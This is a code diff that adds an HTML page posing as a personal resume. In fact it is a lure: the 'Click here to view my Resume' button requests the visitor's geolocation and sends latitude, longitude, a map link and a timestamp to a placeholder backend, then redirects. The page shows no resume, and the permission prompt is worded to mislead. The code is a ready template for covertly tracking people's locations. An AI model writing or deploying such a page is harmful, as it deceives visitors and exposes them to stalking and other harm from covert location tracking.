@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>My Resume</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      text-align: center;
+      padding: 40px;
+    }
+    .card {
+      background: white;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      display: inline-block;
+    }
+    button {
+      padding: 1rem 2rem;
+      font-size: 1rem;
+      border: none;
+      border-radius: 8px;
+      background-color: #28a745;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h2>Please allow permissions</h2>
+  <p>This helps us provide a better experience.</p>
+  <button onclick="getLocation()">Click here to view my Resume</button>
+  <p id="status"></p>
+</div>
+
+<script>
+  function getLocation() {
+    const status = document.getElementById("status");
+
+    if (navigator.geolocation) {
+      status.textContent = "Getting your permission to view my Resume...";
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+          // Send data to your server or webhook (can be PHP, Node.js, Google Forms, etc.)
+          fetch('https://your-backend-url.com/save-location', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon,
+              map_url: googleMapsUrl,
+              timestamp: new Date().toISOString()
+            })
+          }).catch(console.error);
+
+          // Redirect to another file
+          window.location.href = "redirect.html"; // your second file
+        },
+        (error) => {
+          status.textContent = "Failed to get location. Please allow permission.";
+        }
+      );
+    } else {
+      status.textContent = "Geolocation is not supported by your browser.";
+    }
+  }
+</script>
+
+</body>
+</html>
